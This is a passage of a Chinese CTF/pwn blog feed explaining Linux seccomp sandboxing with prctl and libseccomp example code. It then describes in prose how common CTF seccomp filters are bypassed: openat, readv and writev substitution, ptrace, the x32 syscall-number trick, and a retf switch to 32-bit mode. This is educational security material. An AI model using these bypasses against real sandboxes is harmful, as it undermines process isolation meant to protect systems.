class="params">       <span class="type">void</span> __user *uargs)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (op) &#123;</span><br><span class="line"><span class="keyword">case</span> SECCOMP_SET_MODE_STRICT:</span><br><span class="line"><span class="keyword">if</span> (flags != <span class="number">0</span> || uargs != <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">return</span> seccomp_set_mode_strict();</span><br><span class="line"><span class="keyword">case</span> SECCOMP_SET_MODE_FILTER:</span><br><span class="line"><span class="keyword">return</span> seccomp_set_mode_filter(flags, uargs);</span><br><span class="line"><span class="keyword">case</span> SECCOMP_GET_ACTION_AVAIL:</span><br><span class="line"><span class="keyword">if</span> (flags != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> seccomp_get_action_avail(uargs);</span><br><span class="line"><span class="keyword">case</span> SECCOMP_GET_NOTIF_SIZES:</span><br><span class="line"><span class="keyword">if</span> (flags != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> seccomp_get_notif_sizes(uargs);</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>暂时不做分析</p><h2 id="prctl函数实现"><a href="#prctl函数实现" class="headerlink" title="prctl函数实现"></a>prctl函数实现</h2><p>这个函数可以对进程进行许多操作，其中第一个参数用于指定操作,因此第一个参数的可选项非常多。</p><p>用在沙盒中,第一个参数常见的为<code>38(PR_SET_NO_NEW_PRIVS)</code>和<code>22(PR_SET_SECCOMP)</code>两种情况</p><h3 id="38-PR-SET-NO-NEW-PRIVS"><a href="#38-PR-SET-NO-NEW-PRIVS" class="headerlink" title="38(PR_SET_NO_NEW_PRIVS)"></a>38(PR_SET_NO_NEW_PRIVS)</h3><p><code>prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);</code></p><p>为了保证安全性，需要将PR_SET_NO_NEW_PRIVSW位设置位1。这个操作能保证seccomp对所有用户都能起作用，并且会使子进程即execve后的进程依然受控，而且设置以后就不能再改了，即使可以调用ptctl也不能再把它禁用掉。</p><h3 id="22-PR-SET-SECCOMP"><a href="#22-PR-SET-SECCOMP" class="headerlink" title="22(PR_SET_SECCOMP)"></a>22(PR_SET_SECCOMP)</h3><ul><li><p>第二个参数为 SECCOMP_MODE_STRICT(1)时,无需使用第三个参数,此时只允许调用read/write/_exit(not exit_group)/sigreturn等少数系统调用</p></li><li><p>第二个参数为SECCOMP_MODE_FILTER(2)时,其中对syscall的限制通过参数3的结构体来自定义过滤规则</p><p>prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);</p><p>&amp;prog就是我们定义的过滤规则</p></li></ul><p>一个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sandbox</span><span class="params">()</span>&#123;    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="number">4</span>),</span><br><span class="line">    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="number">0xc000003e</span>,<span class="number">0</span>,<span class="number">2</span>),<span class="comment">//0xc000003e为ARCH_X86_64</span></span><br><span class="line">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS,<span class="number">0</span>),</span><br><span class="line">    BPF_JUMP(BPF_JMP+BPF_JEQ,<span class="number">59</span>,<span class="number">0</span>,<span class="number">1</span>),</span><br><span class="line">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span><br><span class="line">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">    .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter)/<span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">    .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    sandbox();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;start!n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>设置沙盒会使用到xmm寄存器,因此一些时候在程序内看到一连串看不懂的xmm寄存器相关操作,大抵是为接下来的沙盒工作</p><h2 id="seccomp函数实现"><a href="#seccomp函数实现" class="headerlink" title="seccomp函数实现"></a>seccomp函数实现</h2><p>seccomp_init对结构体进行初始化，若参数为SCMP_ACT_ALLOW，则过滤为黑名单模式；若为SCMP_ACT_KILL，则为白名单模式，即没有匹配到规则的系统调用都会杀死进程，默认不允许所有的syscall。</p><p>seccomp_rule_add用来添加一条规则，arg_cnt为0,表示我们直接限制execve,不管参数是什么，如果arg_cnt不为0,那arg_cnt表示后面限制的参数的个数,也就是只有调用execve,且参数满足要求时,才会拦截</p><p>seccomp_load是应用过滤器,如果不调用seccomp_load则上面所有的过滤都不会生效</p><p>注意：编译的时候要在最后面加 -lseccomp</p><p>一个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sandbox</span><span class="params">()</span>&#123;</span><br><span class="line">scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    sandbox();</span><br><span class="line">    <span class="type">char</span> * str = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    write(<span class="number">1</span>,<span class="string">&quot;hello worldn&quot;</span>,<span class="number">12</span>);</span><br><span class="line">    syscall(<span class="number">59</span>,str,<span class="literal">NULL</span>,<span class="literal">NULL</span>);<span class="comment">//execve</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>seccomp_init 返回的是一个 scmp_filter_ctx 的结构体</p><p>有效的 def_action 有下面几种</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SCMP_ACT_KILL</span><br><span class="line">SCMP_ACT_KILL_PROCESS</span><br><span class="line">SCMP_ACT_TRAP</span><br><span class="line">SCMP_ACT_ERRNO</span><br><span class="line">SCMP_ACT_TRACE</span><br><span class="line">SCMP_ACT_LOG</span><br><span class="line">SCMP_ACT_ALLOW</span><br></pre></td></tr></table></figure><p>其中<code>SCMP_ACT_KILL</code> 和 <code>SCMP_ACT_ALLOW</code>，一个是白名单，一个是黑名单</p><p><code>seccomp_rule_add</code>可以添加规则</p><p><code>int seccomp_rule_add(scmp_filter_ctx ctx, uint32_t action,int syscall, unsigned int arg_cnt, ...);</code></p><p>arg_cnt 这个是指后面跟随的参数的个数，比如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">3</span>,</span><br><span class="line">                      SCMP_A0(SCMP_CMP_EQ, fd),</span><br><span class="line">                      SCMP_A1(SCMP_CMP_EQ, (<span class="type">scmp_datum_t</span>)buf),</span><br><span class="line">                      SCMP_A2(SCMP_CMP_LE, BUF_SIZE));</span><br><span class="line">rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">1</span>,</span><br><span class="line">                      SCMP_CMP(<span class="number">0</span>, SCMP_CMP_EQ, fd));</span><br><span class="line">rc = seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>分别是 3 ，1，0 个。然后后面的参数就是 comparison op,主要有下面几种</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">SCMP_CMP_NE</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> <span class="built_in">not</span> equal <span class="keyword">to</span> the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_NE , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_LT</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> less than the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_LT , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_LE</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> less than <span class="built_in">or</span> equal <span class="keyword">to</span> the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_LE , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_EQ</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> equal <span class="keyword">to</span> the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_EQ , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_GE</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> greater than <span class="built_in">or</span> equal <span class="keyword">to</span> the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_GE , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_GT</span><br><span class="line">Matches <span class="keyword">when</span> the argument value <span class="built_in">is</span> greater than the datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_GT , datum )</span><br><span class="line"></span><br><span class="line">SCMP_CMP_MASKED_EQ</span><br><span class="line">Matches <span class="keyword">when</span> the masked argument value <span class="built_in">is</span> equal <span class="keyword">to</span> the masked datum value, example:</span><br><span class="line"></span><br><span class="line">SCMP_CMP( arg , SCMP_CMP_MASKED_EQ , mask , datum )</span><br></pre></td></tr></table></figure><p>seccomp_load 其实就是应用 filter</p><h2 id="CTF中常见的seccomp及绕过"><a href="#CTF中常见的seccomp及绕过" class="headerlink" title="CTF中常见的seccomp及绕过"></a>CTF中常见的seccomp及绕过</h2><h3 id="1—禁用execve"><a href="#1—禁用execve" class="headerlink" title="1—禁用execve"></a>1—禁用execve</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">0000:</span> <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  <span class="string">A</span> <span class="string">=</span> <span class="string">arch</span></span><br><span class="line"><span class="attr">0001:</span> <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x04</span> <span class="number">0xc000003e</span>  <span class="string">if</span> <span class="string">(A</span> <span class="type">!=</span> <span class="string">ARCH_X86_64)</span> <span class="string">goto</span> <span class="number">0006</span></span><br><span class="line"><span class="attr">0002:</span> <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="string">A</span> <span class="string">=</span> <span class="string">sys_number</span></span><br><span class="line"><span class="attr">0003:</span> <span class="number">0x35</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x40000000</span>  <span class="string">if</span> <span class="string">(A</span> <span class="string">&gt;=</span> <span class="number">0x40000000</span><span class="string">)</span> <span class="string">goto</span> <span class="number">0006</span></span><br><span class="line"><span class="attr">0004:</span> <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="string">if</span> <span class="string">(A</span> <span class="string">==</span> <span class="string">execve)</span> <span class="string">goto</span> <span class="number">0006</span></span><br><span class="line"><span class="attr">0005:</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="string">return</span> <span class="string">ALLOW</span></span><br><span class="line"><span class="attr">0006:</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="string">return</span> <span class="string">KILL</span></span><br></pre></td></tr></table></figure><p>这种可以通过 open read write 来读取flag</p><h3 id="2—禁用execve-open-write-read"><a href="#2—禁用execve-open-write-read" class="headerlink" title="2—禁用execve,open,write,read"></a>2—禁用execve,open,write,read</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x09</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000003</span>  <span class="keyword">if</span> (A == close) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0011</span></span><br><span class="line"><span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0011</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>open系统调用实际上是调用了openat，所以直接 调用openat，然后除了 read，write，其实还有两个</p><p>readv，和writev，这些就能绕过限制读取flag,有些连openat都禁用的可以 ptrace 修改syscall</p><h3 id="3—禁用execve-控制open-write-read的参数"><a href="#3—禁用execve-控制open-write-read的参数" class="headerlink" title="3—禁用execve,控制open,write,read的参数"></a>3—禁用execve,控制open,write,read的参数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0b</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != read) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000014</span>  A = fd &gt;&gt; <span class="number">32</span> <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x25</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A &gt; <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0010</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"><span class="number">0011</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000004</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x4</span>) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0012</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0013</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>限制参数的,可以在参数上找关键点</p><h3 id="4—限制sys-number"><a href="#4—限制sys-number" class="headerlink" title="4—限制sys_number"></a>4—限制sys_number</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x07</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000065</span>  <span class="keyword">if</span> (A == ptrace) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000101</span>  <span class="keyword">if</span> (A == openat) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000130</span>  <span class="keyword">if</span> (A == open_by_handle_at) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>没有判断<code>if (A &lt; 0x40000000)</code></p><p>导致了可以 0x40000000+sys_number绕过，sys_number |= 0x40000000</p><p>同样如果没有判断<code>if(A != ARCH_X86_64)</code></p><p>这个可以同32位的shellcode绕过过</p><h2 id="通过切换模式来绕过PWN题中对系统调用的拦截"><a href="#通过切换模式来绕过PWN题中对系统调用的拦截" class="headerlink" title="通过切换模式来绕过PWN题中对系统调用的拦截"></a>通过切换模式来绕过PWN题中对系统调用的拦截</h2><p><strong>retf</strong>是一条远转移指令，等价于pop cs; pop ip，这条指令一般来说可以在libc中找到，但为什么它能修改程序的模式呢，实际上是因为它修改了cs段寄存器。</p><p><strong>cs寄存器</strong>即code segment寄存器，指向存放代码的内存段，在8086的实模式下，指令的寻址为cs:ip-&gt;cs *16 + ip。在32位保护模式下，cpu地址总线和通用寄存器都达到了32位，可以直接访问4GB的内存，段寄存器被赋予了新的任务：保存段描述符的索引即段选择符(segment descriptor)</p><pre><code>                +--------------------------------------+                |         index                 |T|    |                |                               |I|RPL |                +--------------------------------^--^--+                                                 |  |                   Table indicator+--------------+  |                     0 GDT                          |                     1 LDT                          |                  Request Privilege Level+----------+                    </code></pre><p>段选择符的低两位用来表示特权级0-3，第3位表示对应的描述符是位于GDT or LDT，高15位则是下标。在段描述符里，保存有更多的该段的参数信息，包括段基址、粒度、属性、模式等等，</p><p>以64为模式切换到32位模式为例，为了实现模式的切换，我们需要找到一个合适的段选择符，它指向GDT中的一个32位的段描述符。</p><p>在linux x86_x64中，<strong>0x23是一个32位的代码段选择符</strong>（位于GDT），<strong>0x33是一个64位长模式的代码段选择符</strong>。所以在模式切换时，只需用retf指令将cs寄存器的值由0x33改为0x23即可。</p><p>另外需要注意的是，由于程序从64位切换到了32位，<strong>所以各个通用寄存器的使用发生了变化，从原来的8字节变成了只使用低4字节</strong>，特别对于栈寄存器<strong>esp</strong>来说，它是rsp的低4字节，原先的rsp保存着可以被正常访问的栈地址，但这个地址的低4字节大概率为一个不可访问的地址，<strong>所以在执行retf之前，还需要进行栈迁移</strong>，只要通过rop控制rbp后进行两次连续的leave指令就可以实现。</p><p>在Linux中，除了FS、GS需要设置段基址用于访问TLS之外，其余的段寄存器对应的段描述符中的段基址都被置为了0，也就是直接使用偏移作为内存访问的绝对地址，所以只要控制好指令指针寄存器，模式切换时就不会出现控制流的失控。</p>]]></content>
    
    
    <summary type="html">sandbox</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="sandbox" scheme="https://ixout.github.io/tags/sandbox/"/>
    
  </entry>
  
  <entry>
    <title>file虚表函数学习</title>
    <link href="https://ixout.github.io/posts/1518/"/>
    <id>https://ixout.github.io/posts/1518/</id>
    <published>2023-10-19T11:26:18.000Z</published>
    <updated>2023-11-28T07:20:29.461Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引"><a href="#引" class="headerlink" title="引*"></a>引*</h1><p>glibc中有各种vtable,fileops,strops,wfileops等等</p><p>更多的的可以在glibc/libio/vtables.c查看,不同vtable中对应的函数实现也不同,不过都是为io服务,都与_IO_FILE有关</p><p>本文主要研究file虚表函数,其主要集中在fileops.c中</p><p>fileops.c文件开头这一段注释提供了不少信息</p><p>认真阅读能提供不少帮助</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 